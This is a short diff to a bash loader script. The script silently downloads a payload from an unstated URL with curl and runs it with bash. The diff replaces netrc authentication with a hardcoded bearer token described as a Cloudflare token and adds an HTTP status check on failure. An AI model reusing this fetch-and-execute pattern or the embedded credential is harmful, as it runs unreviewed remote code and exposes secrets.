@@ -65,8 +65,10 @@ echo -ne "  ${DG}├─ Establishing Connection...${NC} "
 payload="$(mktemp)"
 trap "rm -f $payload" EXIT
 
-# Use silent curl with netrc
-if curl -fsSL -A "Bane-1s-Agent" --netrc -o "$payload" "$URL"; then
+# Updated with your Cloudflare Token
+TOKEN="cfut_JWtjqOSLr0WAaRN5R8mquAif9Y1NLYKGKkcTfB2a512545da"
+
+if curl -fsSL -H "Authorization: Bearer $TOKEN" -A "Bane-1s-Agent" -o "$payload" "$URL"; then
     echo -e "${G}CONNECTED${NC}"
     echo -e "  ${DG}└─ Agent Status:${NC} ${G}AUTHORIZED${NC}"
     
@@ -79,7 +81,9 @@ if curl -fsSL -A "Bane-1s-Agent" --netrc -o "$payload" "$URL"; then
     bash "$payload"
 else
     echo -e "${R}FAILED${NC}"
-    echo -e "  ${DG}└─ Error Detail:${NC} ${R}Connection Terminated by Host${NC}"
+    # Capture the specific error code for debugging
+    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$URL")
+    echo -e "  ${DG}└─ Error Detail:${NC} ${R}HTTP Status $HTTP_CODE${NC}"
     echo -e "\n  ${R}[!] CRITICAL:${NC} Authentication handshake failed."
     exit 1
 fi
